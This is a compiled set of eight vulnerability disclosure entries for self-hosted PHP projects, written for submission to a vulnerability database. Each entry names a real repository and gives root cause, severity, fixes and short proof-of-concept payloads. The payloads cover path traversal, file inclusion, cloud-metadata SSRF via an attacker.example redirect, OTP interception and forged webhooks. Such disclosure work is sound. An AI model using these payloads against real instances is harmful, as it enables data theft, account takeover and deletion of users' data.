# All findings — VulnCheck submission fields (title: value)

Channel: https://vulncheck.com/advisories/report  |  disclosures@vulncheck.com
Reporter (all): Abdulloh Nuriddinov (GitHub: 4bdull0hh) — abdullohnuriddinov677@gmail.com
Status: all 8 ☐ not submitted (as a set here; you have already submitted several individually). All source review of public code; several runtime-confirmed, others code-level as noted.

================================================================================
## Vulnerability 1
================================================================================

Title: repomanager `dist` parameter path traversal → arbitrary directory deletion/creation outside the repository root
Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
Contact: abdullohnuriddinov677@gmail.com
Supplier: lbr38
Product: repomanager (self-hosted deb/rpm package repository manager, PHP)
Source: https://github.com/lbr38/repomanager
Affected version: 6.1.0, `devel` @ a7bc264fa94b1cc325239d0c854569959ec83d68 (reviewed 2026-10-09)
Vulnerability type: CWE-22 / CWE-23 (Path Traversal)
Authentication: Authenticated (user permitted to create/rebuild a deb repository)
CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H → 8.1 (High) (use PR:H → ~6.0 if admin-only)
Impact: Arbitrary recursive directory deletion (primary), plus arbitrary directory creation and fixed-name metadata writes, outside REPOS_DIR (default /home/repo), as the repomanager service account.
Root cause: `Param\Dist::check()` validates the distribution name with `Validate::alphaNumeric($dist, ['-','_','.','/'])`, which permits `.` and `/` and never rejects `..`. The value flows unsanitized through `Repo\Repo::setDist()` into `Repo\Metadata\Create` / `Repo\Metadata\Deb::create()`, which build `REPOS_DIR/deb/<name>/<dist>/...` with no canonicalization/containment and pass it to `Directory::deleteRecursive()` (`/usr/bin/rm -rf "<path>"`) and `mkdir(recursive)`.
Proof of concept: `dist = ../../../../../../tmp/CANARY`; code-level PoC (`poc/verify.php`) shows `Param\Dist::check()` accepts `../` payloads and the resulting `rm -rf "<path>"` escapes REPOS_DIR to delete an outside canary.
Suggested fix: Validate `dist` per path segment `^[A-Za-z0-9._-]+$` rejecting `..`; add realpath-based containment under REPOS_DIR before every rm/mkdir/write; harden `Directory::deleteRecursive()` to canonicalize + contain. (Command injection is NOT possible — the validator blocks shell metacharacters; only traversal is reachable.)
Caveat: Validator gap and traversal-to-delete sink confirmed at code level with the project's own classes; live HTTP→sink wiring and exact required privilege not reproduced on a running instance.
Write-up: security-research/repomanager-dist-path-traversal.md
Packet: security-research/VULNCHECK-SUBMISSION.md

================================================================================
## Vulnerability 2
================================================================================

Title: repomanager unsanitized `controller` POST parameter in `include_once` → authenticated PHP local file inclusion (RCE if a `.php` plant exists)
Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
Contact: abdullohnuriddinov677@gmail.com
Supplier: lbr38
Product: repomanager (self-hosted deb/rpm package repository manager, PHP)
Source: https://github.com/lbr38/repomanager
Affected version: 6.1.0, `devel` @ a7bc264fa94b1cc325239d0c854569959ec83d68 (reviewed 2026-10-09, PHP 8.3)
Vulnerability type: CWE-98 / CWE-22 (Improper Control of Filename for Include/Require)
Authentication: Authenticated (any logged-in user, including read-only; no role or CSRF check)
CVSS 3.1: AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H → ~7.5 (High) for the RCE path; ~7.1 for arbitrary local `.php` inclusion only
Impact: Include and execute any existing local `.php` file; remote code execution when combined with any writable `.php` path (upload or log poisoning).
Root cause: `controllers/public/ajax/controller.php` (served as `/ajax/controller.php`) runs `include_once(ROOT.'/controllers/ajax/'.$_POST['controller'].'.php')` with the raw, unsanitized `controller` POST value — no `../` / absolute-path / basename allow-list check. `.php` suffix forced; `file_exists()` gate applies. `App\Main()`→`Session::load()` only requires a valid session (no role), and the dispatcher performs no CSRF check.
Proof of concept: `poc/lfi-controller-poc.php` reproduces the include line: `controller=../../../plant/pwn` → includes `.../controllers/ajax/../../../plant/pwn.php` → planted PHP executes.
Suggested fix: Allow-list the controller name `^[A-Za-z0-9_]+(/[A-Za-z0-9_]+)*$` and realpath-contain under `controllers/ajax/` before including; add a CSRF token check.
Caveat: Unsanitized include + traversal-to-execute confirmed via PoC of the exact dispatcher logic; end-to-end RCE requires a separate `.php` file-plant primitive, not demonstrated.
Write-up: security-research/repomanager-lfi-controller.md
Packet: security-research/VULNCHECK-SUBMISSION-2-lfi.md

================================================================================
## Vulnerability 3
================================================================================

Title: iNetPanel accounts API `get_user`/`list_domains` skip the assigned-domain scope check → cross-tenant IDOR
Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
Contact: abdullohnuriddinov677@gmail.com
Supplier: tuxxin
Product: iNetPanel (self-hosted hosting control panel, PHP; Cloudflare-tunnel cPanel alternative)
Source: https://github.com/tuxxin/iNetPanel
Affected version: 1.28.0, `main` @ 9b8c2e46afcef006c6f81871fb7857b4e9fd03c4 (reviewed 2026-10-09)
Vulnerability type: CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-285 (Improper Authorization)
Authentication: Authenticated (delegated `subadmin` role)
CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N → ~4.3 (Medium-low) (use C:H → ~6.5 if hosting topology is deemed sensitive)
Impact: A scope-limited `subadmin` reads any hosting account's record and full domain config (document roots, ports, PHP versions, status, disk usage, WireGuard peer IP) outside their assigned-domain scope, breaking tenant/reseller isolation. No credentials exposed.
Root cause: `/api/accounts` (`api/accounts.php`) is gated only by `Auth::check()` (logged in). `list`/`list_users` filter to assigned domains and `detail` calls `Auth::canAccessDomain()`, but `get_user` and `list_domains` perform no scope check. Usernames are predictable (derived from a domain's first label), so any known hosted domain resolves the target username.
Proof of concept: As an authenticated subadmin — `GET /api/accounts?action=get_user&username=<victim>` and `GET /api/accounts?action=list_domains&username=<victim>` both return the victim's data regardless of the caller's assigned domains.
Suggested fix: Apply the same assigned-domain / `canAccessDomain` check used by `detail`/`list` to `get_user` and `list_domains`; centralize as `Auth::canAccessUser()`.
Caveat: Confirmed by code review of the authorization asymmetry between sibling actions; not executed on a live install with two configured roles.
Write-up: security-research/inetpanel-accounts-idor.md
Packet: security-research/VULNCHECK-SUBMISSION-3-inetpanel-idor.md

================================================================================
## Vulnerability 4
================================================================================

Title: smskit unauthenticated `poll.php` → outbound SMS (OTP/2FA) interception and diversion
Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
Contact: abdullohnuriddinov677@gmail.com
Supplier: smskit
Product: smskit (self-hosted SMS gateway; PHP flat-file backend, Android relay app, REST API)
Source: https://github.com/smskit/smskit
Affected version: 1.0.0, `main` @ 69e4ed82e62b5dde1647fc5e0187827a0e164284 (reviewed + runtime-tested 2026-10-09, PHP 8.3)
Vulnerability type: CWE-306 (Missing Authentication for Critical Function) + CWE-200 (Information Exposure)
Authentication: Unauthenticated
CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L → ~8.2 (High)
Impact: A remote unauthenticated attacker polls `api/v1/poll.php?device_id=<any>`; the endpoint auto-registers the device as online and returns queued outbound SMS (recipient number `to` + full `message` — typically OTPs, 2FA codes, password-reset links), marking them `processing` so they are diverted from legitimate delivery. `api/v1/receive.php` and `report.php` are also unauthenticated (forged inbound SMS / delivery reports).
Root cause: The device poll channel has no auth — a device is identified only by a caller-supplied `device_id` with no token/secret. Operator endpoints (send/status/validate/statistics/schedule) require an API key via `api/v1/_auth.php`; the device endpoints have no equivalent. A freshly registered device sorts first (round-robin by `sms_sent_count` ascending) and receives assignments.
Proof of concept (runtime-confirmed): Seed a queued message, then `GET /api/v1/poll.php?device_id=attacker-123&model=Evil&android=99` returns HTTP 200 with `{"commands":[{"to":"+1555...","message":"Your bank OTP is 918273..."}]}`. Reproduced with PHP's built-in server against a copy of `api/v1/` + seeded `config/`.
Suggested fix: Issue a per-device secret token at pairing (store hashed), require it on poll/receive/report with `hash_equals`; stop auto-registering unknown devices.
Caveat: Disclosure + queue-diversion runtime-confirmed. Real-world interception completeness depends on how many legitimate devices are online; the unauthenticated disclosure itself is unconditional.
Write-up: security-research/smskit-poll-unauth-sms-interception.md
Packet: security-research/VULNCHECK-SUBMISSION-4-smskit.md

================================================================================
## Vulnerability 5
================================================================================

Title: EverShelf unauthenticated Telegram webhook (secret token not verified) → shopping/inventory list disclosure
Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
Contact: abdullohnuriddinov677@gmail.com
Supplier: dadaloop82
Product: EverShelf (self-hosted smart pantry manager, PHP)
Source: https://github.com/dadaloop82/EverShelf
Affected version: 1.11.9, `main` @ 8923b468510be592f38eb678035e7e0b2519c2cc (reviewed 2026-10-09)
Vulnerability type: CWE-306 (Missing Authentication for Critical Function)
Authentication: Unauthenticated
CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → ~5.3 worst-case; practically Low (read-only, low-sensitivity, config-dependent — borderline for a CVE)
Impact: With default-empty `TELEGRAM_ALLOWED_CHAT_IDS`, a forged Telegram update makes the bot run read-only commands (`/lista`, `/scadenze`) and DM the victim's shopping list and expiring-inventory list to an attacker-controlled chat.
Root cause: The `telegram_webhook` action (public, in `evershelfPublicActions()`) does not verify Telegram's `X-Telegram-Bot-Api-Secret-Token`. The only gate in `telegramWebhookHandle()` is the optional chat-id allowlist, which is skipped when unset (the default).
Proof of concept: `POST /api/index.php?action=telegram_webhook` with body `{"message":{"chat":{"id":<ATTACKER_CHAT_ID>},"text":"/lista"}}` → bot DMs the shopping list to the attacker's chat.
Suggested fix: Verify a configured webhook `secret_token` via `X-Telegram-Bot-Api-Secret-Token` (`hash_equals`) at the start of the handler; fail closed when the allowlist is unset.
Caveat: Confirmed by code review; not run live. Modest, config-dependent impact — may suit a maintainer hardening fix more than a CVE.
Write-up: security-research/evershelf-telegram-webhook-unauth.md
Packet: security-research/VULNCHECK-SUBMISSION-5-evershelf.md

================================================================================
## Vulnerability 6
================================================================================

Title: kuwo-music-relay unauthenticated, full-read Server-Side Request Forgery via `url=`
Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
Contact: abdullohnuriddinov677@gmail.com
Supplier: cdyUuu
Product: kuwo-music-relay (single-file PHP audio-decrypt relay, `decrypt.php`)
Source: https://github.com/cdyUuu/kuwo-music-relay
Affected version: 1.0.0, `main` @ 90f76911dc977bf729a8b0bb18118d4ce4c5adb8 (committed 2026-08-19; reviewed + runtime-tested 2026-10-11, PHP 8.3)
Vulnerability type: CWE-918 (Server-Side Request Forgery) — full-read (not blind)
Authentication: Unauthenticated
CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L → ~8.2 (High)
Impact: An unauthenticated attacker makes the server fetch arbitrary internal/cloud URLs via the `url=` parameter (e.g. http://169.254.169.254/, http://127.0.0.1:...). Responses are recoverable (decryption is a keystream XOR keyed entirely by the attacker-supplied `ekey`), so internal API responses and cloud-metadata credentials are exfiltrable verbatim.
Root cause: `decrypt.php?url=<any>&ekey=<...>` has no authentication and no destination allow-list. The only SSRF guard is gated on `RELAY_ALLOW_PRIVATE_IP`, which ships `= true` (guard off by default), despite the README advertising "SSRF protection". The returned body is `decrypt($data,$offset)`, and both QMC ciphers (`MapCipher`, `Rc4Cipher`) are keystream-XOR derived only from `ekey`. Even with the guard on, every cURL handle sets `CURLOPT_FOLLOWLOCATION => true` with no redirect re-validation (302→internal bypass) and `isSafeRemoteHost()` resolves with `gethostbynamel()` while cURL re-resolves (DNS-rebinding TOCTOU; unresolvable names are allowed).
Proof of concept (runtime-confirmed): (A) Unmodified default config — `GET /decrypt.php?url=http://127.0.0.1:19999/latest/meta-data/iam-...&ekey=<120 chars>` with `Range: bytes=0-63` causes the relay to fetch the attacker-chosen internal URL (hit logged with the relay's own hard-coded Chrome UA, proving the server made the request; fetch fires before `ekey` is even validated). (B) A harness using the project's own ciphers recovers the fetched bytes: `fetched = server_output XOR cipher.decrypt("\0"*len, offset)` → YES for both MapCipher and Rc4Cipher.
Suggested fix: Ship `RELAY_ALLOW_PRIVATE_IP = false`; allow-list `url` to Kuwo CDN domains re-validated per redirect hop; disable/restrict `CURLOPT_FOLLOWLOCATION` and re-check each hop; resolve once and pin the connection to a vetted public IP (treat unresolvable as deny); consider a shared secret.
Caveat: Part A confirmed at runtime on the unmodified file; Part B proven as a property of the project's own ciphers (so, with attacker control of `ekey`, bytes are recoverable). A full end-to-end read of real cloud metadata through a live cloud host was not run; redirect-follow and DNS-rebind bypasses are identified from code, not separately scripted.
Write-up: security-research/kuwo-music-relay-unauth-ssrf.md
Packet: security-research/VULNCHECK-SUBMISSION-6-kuwo-relay-ssrf.md

================================================================================
## Vulnerability 7
================================================================================

Title: pricebuddy authenticated SSRF via redirect bypass of the PublicHttpUrl guard (/api/meta-extraction)
Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
Contact: abdullohnuriddinov677@gmail.com
Supplier: jez500
Product: pricebuddy (self-hosted price tracker, Laravel + Filament) + bundled dep jez500/web-scraper-for-laravel ^1.0.9
Source: https://github.com/jez500/pricebuddy  (dep: https://github.com/jez500/web-scraper-for-laravel)
Affected version: main @ 34f2b2f7ca3b9853d83ec686e46ad74fc0f21e12 (2026-10-05); app version string "development"
Vulnerability type: CWE-918 (Server-Side Request Forgery) — anti-SSRF guard bypassed by HTTP redirect-follow (validate-once/fetch-follows-redirects); also DNS-rebinding TOCTOU
Authentication: Authenticated — Sanctum API token with the meta-extraction:extract ability
CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L -> ~7.1 (High)
Impact: An authenticated user makes the server fetch arbitrary internal/cloud URLs (169.254.169.254, 127.0.0.1, internal APIs) despite the PublicHttpUrl guard. Readable: the same request supplies the extraction strategy (store.scrape_strategy.title.value as regex/xpath/json), so chosen slices of the internal response are returned in title/price/image.
Root cause: POST /api/meta-extraction validates url with App\Rules\PublicHttpUrl (resolves host, blocks reserved ranges) but only on the INITIAL url. The fetch (jez500/web-scraper-for-laravel: HttpDriver::fetch -> Http::...->get($url), no ->withoutRedirecting()) follows redirects (Guzzle default, up to 5 hops) and never re-checks the redirect target. A public attacker host that 302s to an internal address is fetched. DNS rebinding also bypasses (validate-time resolve vs fetch-time resolve).
Proof of concept: POST /api/meta-extraction {"url":"http://attacker.example/landing","store":{"domains":[{"domain":"attacker.example"}],"scrape_strategy":{"title":{"type":"regex","value":"(?s)(.*)"}}}} -> attacker.example passes the validator and 302s to http://169.254.169.254/latest/meta-data/... -> scraper follows and returns the internal body in title. Runtime-demonstrated: real PublicHttpUrl passes 8.8.8.8 and blocks 127.0.0.1/localhost/169.254.169.254/[::1]; a 302 from the submitted host to an internal target is followed (body leaked) while a no-follow fetch leaks nothing.
Suggested fix: disable redirect following on the scraper HTTP client, or re-run PublicHttpUrl on every redirect Location (Guzzle on_redirect); resolve once and pin the connection to the vetted public IP to defeat DNS rebinding; apply the same to the scraper:3000 microservice path.
Caveat: authenticated (needs an API token with the ability); code path confirmed by reading pricebuddy + the vendored scraper package; validator verdicts and redirect-follow demonstrated at runtime; full end-to-end run against a live instance not performed (needs provisioned DB/token). Sandbox has no outbound DNS / cannot bind a public IP, so the public host is represented on loopback and public IPs given as literals.
Write-up: security-research/pricebuddy-ssrf-redirect-bypass.md
Packet: security-research/VULNCHECK-SUBMISSION-7-pricebuddy-ssrf.md

================================================================================
## Vulnerability 8
================================================================================

Title: dreeve unauthenticated Strava webhook forgery -> arbitrary activity deletion / forced re-import
Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
Contact: abdullohnuriddinov677@gmail.com
Supplier: Robin Ingelbrecht (robiningelbrecht)
Product: dreeve (composer robiningelbrecht/dreeve) - self-hosted Strava statistics dashboard (Symfony, PHP 8.5)
Source: https://github.com/dreeveapp/dreeve
Affected version: master @ 745074da2ac4aa32d1a68571e90230ddcd82f0c6 (2026-10-13); latest release v5.5.0 at review time
Vulnerability type: CWE-306 (Missing Authentication for Critical Function) + CWE-345 (Insufficient Verification of Data Authenticity)
Authentication: Unauthenticated
CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H -> ~9.1 (contingent on webhooks enabled; conservative .../I:H/A:L ~ 8.2)
Impact: Unauthenticated permanent deletion of arbitrary activities from the victim's dreeve instance (and forced Strava-API re-imports / quota abuse). The public dashboard lets the attacker enumerate the victim's real activity IDs and delete the entire history.
Root cause: POST /strava/webhook is public (AppAccessMap::PUBLIC_PATHS) and the event handler does no origin verification - verify_token only guards the GET hub.challenge handshake, owner_id/subscription_id are ignored, and Strava webhooks are unsigned. Only a global "webhooks enabled" flag gates it. Forged {"object_type":"activity","aspect_type":"delete","object_id":<id>} is queued as a WebhookEvent; the app:strava:webhooks-process cron routes delete -> ActivityRepository::markActivitiesForDeletion() (UPDATE Activity SET markedForDeletion=1) -> DeleteActivitiesMarkedForDeletionCommandHandler -> DeleteActivity (hard delete). create/update force re-imports of attacker-chosen IDs.
Proof of concept: unauthenticated POST /strava/webhook with body {"object_type":"activity","object_id":<victim_activity_id>,"aspect_type":"delete","owner_id":1,"subscription_id":1,"event_time":1700000000}; next cron run marks + deletes it. Repeat over IDs harvested from the public /activities/{activityId} pages to wipe the history.
Preconditions: webhooks enabled (import.webhookConfig.enabled) + import mode Strava API (ImportMode::isStravaApi) - the standard live-sync setup; endpoint must be internet-reachable for Strava, and the path is fixed with no secret.
Suggested fix: require a per-instance shared secret on the webhook URL (unguessable path/header) validated on POST with hash_equals; verify owner_id/subscription_id against the configured athlete/subscription; ignore object_ids never imported for this athlete; rate-limit.
Caveat: full chain confirmed by code review with exact file/line citations; not reproduced on a live instance (needs PHP 8.5 + DB + processing cron). Requires webhooks enabled + Strava-API mode (opt-in but documented first-class feature). No confidentiality impact.
Write-up: security-research/dreeve-unauth-webhook-activity-deletion.md
Packet: security-research/VULNCHECK-SUBMISSION-8-dreeve-webhook.md
